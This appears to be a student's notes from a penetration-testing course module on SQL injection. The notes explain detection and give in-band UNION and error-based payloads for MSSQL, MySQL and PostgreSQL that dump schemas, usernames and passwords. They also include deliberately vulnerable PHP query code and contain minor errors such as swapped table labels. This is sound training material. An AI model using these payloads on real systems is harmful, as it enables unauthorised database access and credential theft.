# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Web App Security
# Module 4 - SQL Injection

https://cdn.members.elearnsecurity.com/ptp_v5/section_5/module_4/html/index.html

###### Module Map
1. Introduction to SQL Injection
2. Finding SQL Injection
3. Exploiting In-Band SQL Injection
4. Exploiting Error-Based SQL Injection
5. Exploiting Blind SQL Injection
6. SQLMap
7. Mitigation Strategies
8. From SQLi to Server Takeover

____________________________________________________
## 4.1. Introduction to SQL Injection
An **SQL Injection (SQLi)** attack exploits the injection of SQL commands into SQL queries of a web application. A successful SQLi attack lets a malicious hacker access and manipulate a web application's backend database.

Complex web applications generally use database for storing data, user credentials, or statistics; CMSs as well as simple personal web pages can connect to databases such as *MySQL*, *SQL Server*, *Oracle*, *PostgreSQL*, and others.

To interact with databases, entities such as systems operators, programmers, applications, and web applications use **Structured Query Language (SQL)**

SQL is a powerful interpreted language used to extract and manipulate data from a database. Web applications embed SQL commands, also known as queries, in their server side code.

The code takes care of establishing and keeping the connection to the database by using **connectors**. Connectors are middle-ware between the web application and the database.
  Connector example:
    ```
                      Application
                  ^        ^        ^
                  |        |        |
                  V        |        |
          Driver Manager   |        |
                  ^        |        |
                  |        V        |
                  |      DNS        |
                  |  Configuration  |
                  |        ^        |
                  |        |        |
                  V        V        V
                    Connector/ODBC
                           ^
                           |
                           V
                     MySQL Server
    ```

Before learning how to carry out an attack, we have to know some SQL basics:
- SQL statement syntax
- How to perform a query
- How to *union* the results of 2 queries
- The *DISTINCT* and *ALL* operators
- How comments work

#### 4.1.1. SQL Statements
You can find more information about SQL [here](http://www.w3schools.com/sql/sql_intro.asp)

It is also possible to select constant values:
  ```
  SELECT 22, 'string', 0x12, 'another string';
  ```

You also need to know the **UNION** command, which performs a union between 2 results, operates:
  ```
  <SELECT statement> UNION <other SELECT statement>;
  ```

If a table or query contains duplicate rows, you can use the
  ```
  SELECT **DISTINCT** <field list> <remainder of statement>;
  ```

A *UNION* statement implies *DISTINCT* by default. You can prevent that by using the **ALL** operator:
  ```
  <SELECT statement> UNION ALL <other SELECT statement>;
  ```

Finally a word about **comments**. There are 2 strings you can use to comment a line in SQL:
  - `#` (the hash symbol)
    ```
    SELECT field FROM table; # this is a comment
    ```
  - `-- ` (two dashes followed by a space)
    ```
    SELECT field FROM table; -- this is a comment
    ```

**Example:**
  In the following slides, we will see some SQL queries performed on a database containing 2 tables:
  **Products**
    |ID  |Name    |Description     |
    |----|--------|----------------|
    |1   |Shoes   |Nice shoes      |
    |3   |Hat     |Black hat       |
    |18  |T-Shirt |Cheap           |

  **Accounts**
    |Username |Password |Email             |
    |---------|---------|------------------|
    |admin    |HxZsO9AR |admin@site.com    |
    |staff    |ihKdNTU4 |staff@site.com    |
    |user     |lwsi7Ks8 |usr@othersite.com |


  The following 2 queries provide the same result:
    ```
    SELECT Name, Description FROM Products WHERE ID='1';
    SELECT Name, Description FROM Products WHERE Name='Shoes';
    ```

  This is a **UNION** example between 2 SELECT statements:
    ```
    SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;
    ```

  You can also perform a UNION operation with some chosen data:
    ```
    SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data';
    ```

#### 4.1.2. SQL Queries Inside Web Applications
The previous examples show how to use SQL when querying a database directly from its console.

To perform the same tasks from within a web application, the application must:
- **Connect** to the database
- **Submit** the query to the database
- **Retrieve** the results

Then the application logic can use the results.

The following code contains a PHP example of a connection to a MySQL database and the execution of a query.
  Example:
    ```
    $dbhostname = '1.2.3.4';
    $dbuser = 'username';
    $dbpassword = 'password';
    $dbname = 'database';

    $connection = mysqli_connect($dbhostname, $dbpassword, $dbname);
    $query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";

    $results = mysqli_query($connection, $query);
    display_results($results);
    ```

The previous example shows a **static query** example inside a PHP page:
- `$connection` is an object referencing the connection to the database
- `$query` contains query
- `mysqli_query` is a function which submits the query to the database
- Finally the custom `display_results()` function renders the data

Anatomy of a database interaction in PHP. This example uses a MySQL database:
  ```
  // Configuration
  $dbhostname = '1.2.3.4';
  $dbuser = 'username';
  $dbpassword = 'password';
  $dbname = 'database';

  $connection = mysqli_connect($dbhostname, $dbpassword, $dbname); // Connection
  $query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;"; // Query definition

  $results = mysqli_query($connection, $query); // Submit
  display_results($results); // Usage
  ```

#### 4.1.3. Vulnerable Dynamic Query

However, most of the times queries are not static, they are **dynamically built** by using the user's inputs. Here you can find a **vulnerable** dynamic query example:
  ```
  $id = $_GET['id'];

  $connection = mysqli_connect($dbhostname, $dbpassword, $dbname);
  $query = "SELECT Name, Description FROM Products WHERE ID='$id';";

  $results = mysqli_query($connection, $query);
  display_results($results);
  ```

  The previous example shows some code which uses **user supplied input to build a query** (the *id* parameter of the GET request). The code then submits the query to the database.

  Although the code is functionally correct, this behavior is very dangerous, because a malicious user can exploit the query construction to take control of the database interaction.

  Let us see how!

The dynamic query:
  ```
  SELECT Name, Description FROM Products WHERE ID='$id';
  ```
  Expects *$id* values such as:
  - `1` => `SELECT Name, Description FROM Products WHERE ID='1';`
  - `Example` => `SELECT Name, Description FROM Products WHERE ID='Example';`
  - `Itid3` =>`SELECT Name, Description FROM Products WHERE ID='Itid3';`
  Or any other string.

But what if the attacker crafts a `$id` value which can actually **change** the query?
  Something like:
    ```
    ' OR 'a'='a
    ```
  Then the query becomes:
    ```
    SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
    ```

  This tells the database to select the items by checking two conditions:
  - The id must be empty (`id=''`)
  - **OR** an always true condition (`'a'='a'`)

  While the first condition is not met, the SQL engine will consider the second condition of the OR. This second condition is crafted as an always true condition.

  In other words, this tells the database to select all the items in the *Product* table!

An attacker could also exploit the UNION command by supplying:
  ```
  UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
  ```
  Thus changing the query to:
  ```
  SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
  ```

  This asks the database tot select the items with an **empty** id, thus selecting an empty set, and then to perform a union with all the entries in the *Accounts* table.

  By using some deep knowledge about the database management system in use, an attacker can get access to the entire database just by using a web application.

#### 4.1.4. How Dangerous is a SQL Injection
Before going deeper into the **find and exploit process** of SQL injection vulnerabilities, you should understand where these vulnerabilities can lead when they are successfully exploited.

First, we have to understand that based on the DBMS that the web application is using (MySQL, SQL Server,...), the attacker is capable of performing a number of actions that go much further than the mere manipulation of the database.

  An attacker could read the file systems, run OS commands, install shells, access the remote network, and basically own the whole infrastructure.

  This is not always the case however, as we will see later, the more powerful the DBMS, the more advanced the SQL is.
  This increases the capabilities of an attacker after the exploitation.

  Keep in mind that accessing a database that stores confidential data (user credentials, SSNs, credit cards, and whatever sensitive information an enterprise, company, or individual may store in a database) is the single most dangerous form of attack on a web application.

Among all the vulnerabilities that may affect web applications, SQL injections are the **first checked by hackers** because of the fact that they produce the most immediate results.
  Example:
    An XSS attacks involves some steps, intelligence, and planning for its successful exploitation. An SQL injection vulnerability, once found, is ready to be exploited.

#### 4.1.5. SQLi Attack Classification
There is a great deal of literature about SQLi and there are many different types of classifications, each one based on different aspects such as:
- Scope of the attack
- Exploitation vector
- Source of the attack

In this section we will refer 3 different **injection attacks and exploitation** types:
- **In-band**
- **Error-based**
- **Blind SQL**

These classifications are based on the exploitation method used to carry out the attack. This will help you follow the explanations of the detection and exploitation phases. Now let's see it in detail!

**In-band SQL Injection** leverage the same channel used to inject the SQL code (i.e. the pages generated by the web application).
  Example:
    During an in-band attack the penetration tester finds a way to ask the web application for the desired information.

During an **Error-Based SQL Injection Attack**, the penetration testers tries to force the DBMS to output an error message and then uses that information to perform data exfiltration.
  Example:
    To exploit an error-based injection, the penetration tester needs to use advanced DBMS features. Errors could be sent either via the **web application output or by other means** such as automated reports or warning emails.

A web application vulnerable to **blind SQL injection** does not reflect the results of the injection on the output. In this case the penetration tester must find an **inference** method to exploit the vulnerability.
  Example:
    Inference exploitation is usually carried out by using true/false conditions.
    The penetration tester can understand if a condition is true or false by studying the web application behavior.

____________________________________________________
## 4.2. Finding SQL Injection
To exploit an SQL Injection you have to first find out where the **injection point** is, then you can craft a **payload** to take control over your target's dynamic query.

The most straightforward way to find SQL injections within a web application is to probe its inputs with characters that are known to cause the SQL query to be syntactically invalid and thus forcing the web application to return an error

Note: Not all the inputs of a web applications are used to build SQL queries. In the *Information Gathering* module, we suggested that you categorize the different input parameters and save the ones used for database data retrieval and manipulation.

In the following slides, we will see how to use the information gathered to identify and exploit SQLi vulnerabilities.

Input parameters are carried through: **GET and POST requests, HEADERS and COOKIES**.
We have to check all these channels where data is retrieved from the client.

The following examples, for the sake of simplicity, will examine scenarios where inputs are taken straight from the URL (with the GET method). The same techniques apply to other channels.

#### 4.2.1. Simple SQL Scenario
For the purpose of explaining the process of finding SQL Injections, we created a small (vulnerable) e-commerce web application showing cell phones for sale.
  Example:
    `ecommerce.php` takes an input parameter named `id` that read the product features from the database and prints them out on the page.

    The `id` parameter is expected to be an integer.
    Sending the `id=1` GET parameter makes the application behave correctly. (see img-50)

    When sending a comma (`id=,`) however, makes the application throws an error.(see img-51)

Testing input for SSQL injection means trying to inject:
- String terminators: `'` and `"`
- SQL commands: **SELECT**, **UNION**, and others
- SQL comments: `#` or `--`

And checking if the web application starts to behave oddly.

Always test **one injection at the time!** Otherwise you will not be able to understand what injection vector is successful.    

#### 4.2.2. SQL Errors in Web Applications
The web application we have just seen, prints internal errors on its input pages.
This behavior helps developers **and penetration testers** to understand what is going on under the hood of a web application.

Every DBMS responds to incorrect SQL queries with different **error messages**.

Even within the same DBMS, error messages change according to the specific function the web application uses to interact with it.

Example:
  In the previous example we saw the `mysql_fetch_assoc()` function triggering an error due to our invalid input.

  A typical error from **MS-SQL** looks like this:
    ```
    Incorrect syntax near [query snippet]
    ```
  While a typical **MySQL** looks more like this:
    ```
    You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version for the right syntax to use near [query snippet]
    ```

If during an engagement, you find error similar to the previous one, it is very likely that the application is vulnerable to an SQL injection attack.

This is not always the case, sometimes you have to have **educated guesses** in order to understand if a  web app is vulnerable or not.

#### 4.2.3. Boolean Based Detection
Currently, most production web sites do not display such errors.
This happens both because of the usability of the application, it is useless to display errors to end users who cannot understand or fix them, and to achieve **security through obscurity**.

**Security through obscurity** is the use of secrecy of design, implementation or configuration in order to provide security.
In the following slides you will see how this approach cannot defend a vulnerable application from **SQL injection attacks**.

If a web application does not display errors in its output, it is still possible to test for SQL injection by using a **Boolean based detection technique**.

The idea behind this process is simple, yet clever: trying to craft payloads which transform the web application queries into True/False conditions. The penetration tester then can infer the results of the queries by looking at how the application behavior changes with different True/False conditions.
  Example:
    To demonstrate how to detect a Boolean based SQLi, we created a website hosting an image gallery. Every images has an ID that identifies it (`id=1444`). (see img-60)

    As usual, we try to detect the injection point by sending the web application SQL-reserved characters. In this example, a string termination character (`id=1444'`). The result is: The web application does not display an image. (see img-62)

    Unfortunately, the application behaves in the same way when we ask for an image that simply does not exist. For example, if we pass `id=999999` as GET parameter.

    We suspect that the query behind the page is something like
      ```
      SELECT <some fields> FROM <some table> WHERE id='GETID';
      ```

    So we can try to inject `999999'` or `'1'='1` to transform the query into:
      ```
      SELECT <some fields> FROM <some table> WHERE id='999999 or '1'='1';
      ```

    Which basically is an **always true condition**.

  Testing this payload on the web application gives us back an output! To be sure, we also need to test an always false condition

    We then change our payload to `999999'` or `'1'='1` which is an **always false condition**:
      ```
      SELECT <some fields> FROM <some table> WHERE id='999999 or '1'='2';
      ```

  It is also possible to test a little more with other always true or always false conditions such as:
  - `1141' and 'els'='els`
  - `1141' and 'els'='elsec`
  - `1141' and 'hello'='hello`
  - `1141' and 'hello'='bye`
  - `els' and '1'='1`
  - `els' and '1'='2`

After detecting a potential injection point, it is time to test if it is actually possible.
In the following chapters, you will see different techniques to exploit SQL injection vulnerabilities.

____________________________________________________
## 4.3. Exploiting In-Band SQL Injection
**In-band SQL injection** techniques make the retrieval of data from the database very powerful thanks to the use of the **UNION** SQL command. For this reason, in-band injections are also known as *UNION-based SQL injection*.

This kind of attack lets penetration tester extract the database content, in the form of the database name, tables schemas, and actual data.

As we have seen in the first chapter of this module, the *UNION* statement combines the result-set of two or mote *SELECT* statements.
  Example:
    ```
    SELECT <field list> FROM <table> UNION SELECT <field list> FROM <another table>;
    ```
#### 4.3.1. First Scenario
We will see how to exploit an in-band SQL injection by studying some scenarios.
  In the first scenario the database contains 2 tables: `CreditCards` and `Users`.
    **CreditCards**
    |id(int)|username(string)|password(string)|real_name(string)|
    |-------|----------------|----------------|-----------------|
    | 1     | admin          |strongpass123   |Armando Romeo    |
    | 2     | fred           |wowstrongpass123|Fred Flintstone  |

    **Users**
    |user_id(int)|Cc_num(int)        |CVS(int)|
    |------------|-------------------|--------|
    | 1          |0000 1111 2222 3333| 123    |
    | 2          |0123 4567 8901 2345| 321    |

  The *user_id* column is the foreign key of the *Users* table.
  In this example *admin* has a credit card number of *0000 1111 2222 3333* while *fred* has a credit card number of *0123 4567 8901 2345*.
    **CreditCards**
    |id(int)|username(string)|password(string)|real_name(string)|
    |-------|----------------|----------------|-----------------|
    | 1     | admin          |strongpass123   |Armando Romeo    |
    | 2     | fred           |wowstrongpass123|Fred Flintstone  |

    **Users**
    |user_id(int)|Cc_num(int)        |CVS(int)|
    |------------|-------------------|--------|
    | 1          |0000 1111 2222 3333| 123    |
    | 2          |0123 4567 8901 2345| 321    |

  The web application uses the following code to display usernames:
    ```
    <?php
    $rs=mysql_query("SELECT real_name FROM users WHERE id=".$_GET['id'].";");
    $row=mysql_fetch_assoc($rc);


    echo $row['real_name'];
    ?>
    ```
    As you can see, there is a clear SQL injection point in the id field of the SQL query.

  We can now exploit the SQLi vulnerability to retrieve the credit card associated with a username. Our payload is:
    ```
    9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1
    ```

  The payload makes the query in the web application transform into the following:
    ```
    SELECT real_name FROM users WHERE id=9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1;
    ```

    As there are no *users* with *id=9999* the web application will display on its output the *cc_num* of the first user.

  We can now submit the payload to the web application by sending a *GET request* with either the browser or, via different tool:
    ```
    /vuln_to_inband.php?id=9999 UNION ALL SELECT cc_num FROM CreditCards WHER user_id=1
    ```
    Note the use of `ALL` operator. We used it to avoid the effect of an eventual *DISTINCT* clause in the original web application query.

  Another good trick to use when exploiting a SQL injection vulnerability is to use **comments**. A payload such as:
    ```
    9999 UNION ALL SELECT cc_num FROM CreditCards WHERE user_id=1; -- -
    ```
    This comments out any other SQL code which could follow our injection point.

#### 4.3.2. In-band Attack Challenges
There are many things to note in the previous attack:
- The field types of the second SELECT statement  should match the ones in the first statement
- The number of fields in the second SELECT statement should match the number of fields in the first statement
- To successfully perform the attack, we need to know the structure of the database in terms of tables and column names

To solve the first two issues, we can use an advanced technique to find what columns are used in a *SELECT* statement. We are looking for the number of columns and their type.

We will see how to reverse-engineer the database structure later. In the following examples we assume that we know the structure of the database.

##### 4.3.3. Enumerating the Number of Fields in a Query
Let us see how to **enumerate** the number of columns, or field, in query selects.
  The following line contains the vulnerable query:
    ```
    mysql_query("SELECT real_name FROM users WHERE id=".$_GET['id'].";");
    ```
    The columns have the following data types:
    - `id` has data type `int`
    - `real_name` has data type `varchar` (a string)

  In this case, the query selects two columns with type `integer` and `varchar`.
  As most engagements are black-box penetration tests, we need a way to find:
  - Number of columns a vulnerable query selects
  - The data type of each column

  Finding the number of fields in a query is a cyclical task.

  If we do not provide the correct number of fields in the injected query, it will not work. This will throw an error on the web application output or simply mess up the contents of the output page rendering.

  If the web application outputs an error, please note that every DBMS outputs a different error string:
    **MySQL** error:
      ```
      The used SELECT statements have a different number of columns
      ```
    **MS SQL** error:
      ```
      All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target lists.
      ```
    **PostgreSQL** error:
      ```
      ERROR: each UNION query must have the same number of columns
      ```
    **Oracle** error:
      ```
      ORA-01789: query block has incorrect number of result columns
      ```

  We start by injecting a query that selects *null* fields.
  We start with a single field and then increase the number of fields until we build a valid query.
    Example:
      Detecting the number of fields needed to exploit an in-band SQL injection looks like the following:
      1. `999 UNION SELECT NULL; -- -`
      2. `999 UNION SELECT NULL, NULL; -- -`
        ...
      4. `999 UNION SELECT NULL, NULL, NULL, NULL; -- -`

      We can iteratively add null fields until the error disappears.
      This will force the web application to execute the following queries:
      - `SELECT id, real_name FROM users WHERE id='999' UNION SELECT NULL; -- -`
        Which triggers an error (the left hand query selects two field while the right hand query selects just one field)
      - `SELECT id, real_name FROM users WHERE id='999' UNION SELECT NULL, NULL; -- -`
        Which triggers an error (the left hand query selects two field while the right hand query selects just one field)

#### 4.3.4. Blind Enumeration
However, what about a web application that does not display errors?
  The basic idea is similar (increasing the number of fields at every step) but, in this case, we want to start with a **valid id** and then inject our query.

  As we did before, we increase the number of fields selected until we create a valid query.
    Example:
      The `view.php` page displays a picture with `id` 1338 (see img-90)

      We try to inject a query with a single field.
        The payload is: `1138' UNION SELECT null; -- -`
        The page is not rendered correctly, there must be an error in the query.

      We increase the number of fields.
        The payload is: `1138' UNION SELECT null,null; -- -`
        The page now works, this means that the query is correct.

      With our last payload we forced the web application to run the following query:
        ```
        SELECT field1, field2 FROM table WHERE id='1138' UNION SELECT null, null; -- - <remainder of the original query>
        ```

#### 4.3.5. Identifying Field Types
After identifying the number of fields, we need to find their **type**.
Most of the DBMSs perform type enforcing on the queries.
  Example:
    If the DBMS performs type enforcing on *UNION* statements you cannot perform a *UNION* between an integer and a string. Therefore,
      ```
      SELECT 1 UNION 'a';
      ```
    will trigger an error!

Depending on how the DBMS handles data types, we are required to provide an exact match of the data types for each column in the two **SELECT** statement.
  |DBMS         |Type Enforcing|
  |-------------|--------------|
  |MySQL        | No           |
  |MS SQL Server| Yes          |
  |Oracle       | Yes          |
  |PostgreSQL   | Yes          |

Finding the data types used in the queries is, once again, a cyclical process. We have to:
- Substitute one of the `null` fields in our payload with a constant
- If the constant type used is correct, the query will work
- If the type is wrong the web application will output an error or misbehave

In the next example, we will try to find the data types used in a query.

We found an in-band SQL injection with two fields.
  Our current payload is:
    ```
    ' UNION SELECT null, null, -- -
    ```
  So we try to test if the first field is an integer by sending:
    ```
    ' UNION SELECT 1, null; -- -
    ```

  If the web application works correctly we can assume that the first field is an integer so we proceed from:
    ```
    ' UNION SELECT 1, null; -- -
    ```
  To:
    ```
    ' UNION SELECT 1, 1; -- -
    ```

  If we get an error, or the application misbehaves, then the second field is not an integer therefore, we can move on to:
    ```
    ' UNION SELECT 1, 'a'; -- -
    ```

    As we see from this example, the second field is a string!

#### 4.3.6. Dumping the Database Content
After finding out the number of columns and their types, it is possible to extract information about the database, the server, and the database data.

We will see how to use specific DBMS features to extract this information later. Let us first cover other exploitation techniques.

(see vid-101)

____________________________________________________
## 4.4. Exploiting Error-Based SQL Injection
**Error-based SQL injections** are another way to retrieve data from the database. While they do not ask for data directly, they actually use some advanced DBMS functions to trigger an error. The error message contains the information the penetration tester is aiming for.

Most of the times the error message is reflected on the web application output, but it could also be embedded in an email message or appended to a log file. It depends on how the web application is configured.

Error-based SQL injection is one of the fastest ways to extract data from a database. It is available on DBMSs such as Oracle, PostgreSQL, and MS SQL Server.

Some DBMSs are very generous in terms of information given within error message. In some of the previous examples, we used errors to match conditions of success or failure.

This time, we will retrieve **database names**, **schemas**, and **data** from the errors themselves. We will see some MS SQL Server specific payloads and then introduce some attack vectors for other DBMSs. The basic principle is the same across any DBMS.

#### 4.4.1. MS SQL Server Error-based Exploitation
**MS SQL Server** reveals the name of database objects within error messages.
Let us see it in action.

We ported our vulnerable e-commerce application to ASP+MSSQL to show the process of dumping the whole database schema and data manually.

The schemas are databases with the singular purpose of describing all other user-defined databases in the system.

In MSSQL, **sa** is the super admin and has access to the *master* database. The *master* database contains schemas of user-defined databases.

The first piece of information we would like to know is the database version so that we can build our exploits accordingly.
To do this, we will force the DBMS to show an **error** including the database version.

  One of the most used tricks is to **trigger a type conversion error** that will reveal to us the wanted value.

  From now on we will refer to this scenario:
  - DBMS is MS SQL Server
  - The vulnerable app is `ecommerce.asp?id=1`
  - The id parameter is vulnerable to SQLi

Steps:
1. **The CAST Technique**
The injection payload used for this technique is as follows:
  ```
  9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
  ```
  This payload is used as input to the vulnerable parameter of the web app: `ecommerce.asp?id=PAYLOAD`.

  We can now dissect the payload to understand all its parts.
    - *Returning no records* (`9999999`)
      `9999999` is just a bogus value, you can put anything here, provided that it is not an id present in the database (we want the `OR` part of the SQL query to be executed, so the first condition should be `FALSE`)

    - *Triggering an Error* (`or 1 in`)
      This is the part of the SQL that will trigger the error.
      We are asking the database to look for integer value 1 within a `varchar` column

    - *Casting* (`CAST(<FIELDNAME> as varchar(4096))`)
      This is where we insert the column that we want to dump.
      (Either a column of a user defined database or a "special" database column).
      `<FIELDNAME>` can be a SQL function like `user_name()` or a variable like `@@version`

    - *Narrowing down* (`WHERE <FIELDNAME> NOT IN (<LIST>)`)
      We will use this part in the iterations to dump the database data.
      This part can be omitted/adjusted at our disposal according to which table our searched fieldname value belongs to.

2.  **Retrieving the SQL Server Version**
  ```
  9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096))) --
  ```
  This is a very simple example of how to use this type of payload.
  We used the `@@version` variable name

  Running this payload on the vulnerable web application makes it print the output:
    ```
    [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (x64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)' to data type int.
    ```
    Thus, printing the DBMS version.

  Knowing the database version is really important because it helps you during the exploitation phase.
    Example:
      Different MS SQL Server versions have different default column names in the *master* database.

      We can find information about the structure of the *master* database on [MSDN](https://msdn.microsoft.com/en-us/library/ms187837.aspx)

3. **Dumping the Database Data**
  In the following section, we will see how to extract information from a database by using error-based SQL injections:
  - Current database username
  - Current database name
  - Installed databases
  - The tables into a given database
  - The columns of a given table
  - Database data

  We can now see how to extract various information via error-based SQL injections by using CAST technique

  In the following examples we will attack a vulnerable web application: http://somesite.xxx/vuln.php?id=1

  The `id` parameter is vulnerable, therefore we will inject our payloads via a web browser.

  Steps:
  1. Finding the Current Username
    The first step is to understand the level of privilege we have, by finding the current database user:
      ```
      9999 or 1 in (SELECT TOP 1 CAST (user_name() as varchar(4096))) --
      ```
      `User_name()` is a MS SQL function which returns the current database user.

      This is the output of the application:
        ```
        [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value 'user' to data type int.
        ```

      The current database user is just `user`, so we do not have administrative privileges (as the *sa* would have).
      We can still dump all the databases to which *user* has access to.

  2. Finding Readable Database
    So the next step is enumerating the databases that *user* can access.
    To do that, we will iterate through the *MASTER* database to find all the databases that we can read. The payload is:
      ```
      9999 or 1 in (SELECT TOP 1 CAST (db_name(0) as varchar(4096))) --
      ```
      The `DB_NAME()` function accesses the *master..sysdatabses* table which stores all the databases installed on the server. We can only see the database that *user* has rights to.

    To enumerate all the databases that *user* can access, we just have to increment the `db_name()` argument:
      ```
      9999 or 1 in (SELECT TOP 1 CAST (db_name(1) as varchar(4096))) --
      ```
      Cycle trough 1, 2, 3, and continue until we cannot enumerate any more databases.


  3. Enumerating Database Tables
    We now have a list of installed databases and the current database in use.

    This time, we want to **enumerate all the tables in the current database** (the same technique can easily be modified to apply to other databases)

    We will use the following payload scheme:
      ```
      9999999 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --
      ```
      Description:
      - `xtype='U'`
        Means that we are only interested in user-defined variables
      - `name NOT IN ('<known table list>')`
        Name is a column of the `sysobjects` special table. Every time we find a new table we will append it to the NOT IN list. This is needed because the error displays only the first table name.

        Example:
          If a database contains three tables:
          - HR
          - Customers
          - Products
          `<known table list>` will:
          - Be empty in the first payload. `... name NOT IN ('')`  will work!
          - Contain `HR` at the second step
          - Contain `HR`, `Customer`, `Products` at the last step

    4. Enumerating Columns
      After retrieving the tables of a database, it is also possible to recover the columns of each table. This is the *schema* of the database and we can retrieve it by using the following payload template:
        ```
        9999 or 1 in (SELECT TOP 1 CAST (<db_name>..syscolumns.name as varchar(4096)) FROM <db_name>..syscolumns,<db_name>..sysobjects WHERE <db_name>..syscolumns.id=<db_name>..sysobjects.id AND  <db_name>..sysobjects.name=<table name> AND <db name>..syscolumns.name NOT IN (<known column list>)); --
        ```
        Description:
        - `<db name>` is the name of the database we are working on
        - `<table name>` is the name of the table which we are studying
        - `<known column list>` is a list of the columns we already retrieved

    5. Dumping Data
      After enumerating the databases and their schemas, we can proceed to the data dumping phase.

      To retrieve the actual content of the database, we need to use the knowledge we obtained of the database structure.
      We will, again, trigger some errors by using the cast technique.

      You can dump the data by using the same technique we have seen for schema enumeration:
        ```
        9999999 or 1 in (SELECT TOP 1 CAST(<column name> as varchar(4096)) FROM <database name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
        ```
        Let us see a couple of tricks to trigger error depending on the field data type.

        Example:
          In this example we exploited `page.php?id=1` and identified a table called **users** in the database **cms**.
          The table contains the following columns:
          - `id` (int)
          - `username` (varchar)
          - `password` (varchar)

          To retrieve the `id` values, you can use the following payload:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(id as varchar)%2bchar(64) FROM cms..users WHERE id NOT IN ('')); -- -
            ```
            Please note the concatenation of the `id` value with `@`.
            This **ensures that the selected id has data type varchar** thus making the cast error possible!

            Sending `%2b` to the web application means sending the `+` character to the DBMS. The `+` character serves as string concatenation command.

              So the resulting error is something like:
              ```
              [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
              ```

          Then we can proceed with the usual method. We filter out the id we already have:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(id as varchar)%2bchar(64) FROM cms..users WHERE id NOT IN ('1')); -- -
            ```

            So the resulting error is something like:
            ```
            [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
              ```

          After extracting all the ids, we can use this information to extract all the usernames:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id=1); -- -
            ```
            No string concatenation is needed here, because *username* data type is varchar. Using the ids, lets us correlate usernames and passwords by retrieving the password of a specific username.

          We can retrieve a password by using pretty much the same payload we used for the username:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1); -- -
            ```

          Or even **concatenate the username and password**:
            ```
            9999999 or 1 in (SELECT TOP 1 CAST(username%2bchar(64)password as varchar) FROM cms..users WHERE id=1); -- -
            ```

In the following video you will see how to manually exploit error-based SQL injections.
You will see different ways to trigger errors, and some applied payload examples. Moreover, you will see how to submit your payload via the browser and a command line utility.

(see vid-139)

#### 4.4.2. MySQL Error-Based SQLi Exploitation
To exploit error-based SQL injection on MySQL, we will use the `GROUP BY` statement.
This statement groups the result-set by one or more columns.
  Example:
    The following query selects the screen names from the `accounts` tables.
    Please note the 2 `David` values:
    ```
    mysql> select displayname from accounts;
      +-------------------+
      | displayname       |
      +-------------------+
      | Aspen Byers       |
      | Alexandra Cabrera |
      | David             |
      | David             |
      +-------------------+
      4 rows in set (0.00 sec)
      ```

    An this is the output of the same query with the `GROUP BY` statement.
    There is just a single `DAVID` value.
      ```
      mysql> select displayname from accounts group by displayname;
      +-------------------+
      | displayname       |
      +-------------------+
      | Aspen Byers       |
      | Alexandra Cabrera |
      | David             |
      +-------------------+
      3 rows in set (0.00 sec)
      ```

The following statement in a skeleton you can use to create your MySQL error-based injections:
  ```
  SELECT 1,2 UNION SELECT COUNT(*), CONCAT(<information to extract>, floor(rand(0)*2)) AS x FROM information_schema.tables GROUP BY x;
  ```

  Example:
  To extract the database version (*4.5.43-0+deb7u1* in this example) you can use:
      ```
      mysql> SELECT COUNT(*), CONCAT(version(), floor(rand(0)*2)) AS x FROM information_schema.tables GROUP BY x;
      ERROR 1062 (23000): Duplicate entry '4.5.43-0+deb7u1' for key 'group_key'
      ```

#### 4.4.3. PostgreSQL Error-Based SQLi Exploitation
  To exploit a SQLi on a web application using **PostgreSQL**, you have to leverage the cast technique we saw for MSSQL.
    Example:
    You can use this technique to extract the DB version:
      ```
      # select cast(version() as numeric);
      ERROR: invalid input syntax for type numeric: "PostgreSQL 9.1.15 on x86_64-unknown-linux-gnu, compiled by gcc (Debian 4.7.2-5) 4.7.2, 64-bit"
      ```
    Or the tables, by iterating over the *information_schema* special database:
      ```
      dbname=# select cast((select table_name from information_schema.tables limit 1 offset 0) as numeric);
      ERROR: invalid input syntax for type numeric: "pg_statistics"
      dbname=# select cast((select table_name from information_schema.tables limit 1 offset 1) as numeric);
      ERROR: invalid input syntax for type numeric: "pg_type"
      dbname=# select cast((select table_name from information_schema.tables limit 1 offset 2) as numeric);
      ERROR: invalid input syntax for type numeric: "pg_attribute"
      ```

To exploit an Error-based SQL injection you need the techniques and payload skeletons we have seen in this chapter and you have to study how different DBMS functions work.

You can refer the to the following cheat sheets by *PentestMonkey* to craft your payloads:
- [MSSQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
